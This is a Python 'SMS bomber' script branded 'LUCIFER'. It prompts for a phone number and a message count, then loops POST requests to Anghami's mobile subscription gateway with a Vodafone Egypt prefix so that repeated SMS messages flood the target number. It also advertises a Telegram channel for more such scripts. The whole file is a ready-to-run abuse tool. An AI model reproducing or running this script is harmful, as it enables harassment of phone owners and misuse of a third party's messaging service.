# = = = = = = = = = = = = «COLOR» = = = = = = = = = = = #

R     ="\033[1;31m"      # Red
G     ="\033[1;32m"      # Green
Y     ="\033[1;33m"      # Yellow
B     ="\033[1;34m"      # Blue
P     ="\033[1;35m"      # Purple
C     ="\033[1;36m"      # Cyan
W    ="\033[1;37m"      # White
R1   = '\033[2;31m'      #Red_2
P1   = '\033[2;35m'      # Pink
LB   = '\033[2;36m'      # Cloud 
L      = '\033[1;34m    ' # Light_Blue

# = = = = = = = = = = = = «LIBRARY» = = = = = = = = = = = #

import uuid,random,user_agent,datetime,string,time,threading,json,secrets,subprocess,hashlib
import requests, pyfiglet, termcolor, sys, os, webbrowser as time, datetime, time
from random import *
from user_agent import generate_user_agent
from datetime import datetime
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
from colorama import Fore, Style
from uuid import uuid4
from secrets import token_hex
from bs4 import BeautifulSoup
aa = 0
zz = 0

# = = = = = = = = = = = = = = = = = = = = = = = 


print (R+'    --------- / Start The Hunt pls Wait / ----------')
sleep(5)
os.system("clear")
lucifer = pyfiglet.figlet_format(' L U C I F E R ')
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(00000.01)
jalan('''\033[1;33m All Scripts ON TELEGRAM CHANNEL : https://t.me/mohtrfandroid ''')
print('')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/100)
j('*'*60)
print('  ')
print(f'{W} ')
print(lucifer)
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/100)
j(Y+'*'*60)
print('\n')
os.system('clear')
num=input(f'🔺  {P}Enter Your Number    {G}> ')
vf='+2'
count=input('Enter count sms : ')
for i in range(int(count)):
	url="http://m.angha.me/gateway.php"
	headers={'Host':'m.angha.me',
       'Connection':'keep-alive',
       'Content-Length':'105',
       'Accept':'application/json, text/plain, */*',
       'User-Agent':'Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Mobile Safari/537.36',
       'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
       'Sec-GPC':'1',
       'Origin':'http://m.angha.me',
       'Referer':'http://m.angha.me/plus/operators/vodafoneeg?pid=717&source=significant%C2%A7sms',
       'Accept-Encoding':'gzip, deflate',
       'Accept-Language':'en-US,en;q=0.9',
       'Cookie':'country=null; userlanguageprod=en; language=en; appversion=0.0.2316; fingerprint=eyJmcCI6IjhhZTAxNDNkLWM3ZWUtNGZhNS1iZmE0LTRiYjBkOTY4NTMxOSIsImgiOiJiNWRlODFhNCJ9'
	}
	data={'msidn':vf+num,
     'source':'significant§sms',
     'resend':'0',
     'planid':'717',
     'output':'jsonhp',
     'type':'SUBSCRIBEvodafoneeg'}
	rr=requests.post(url,headers=headers,data=data).text
	if "ok" in rr:
		print("Done Sent")
	else:
		print(R+"ERROR")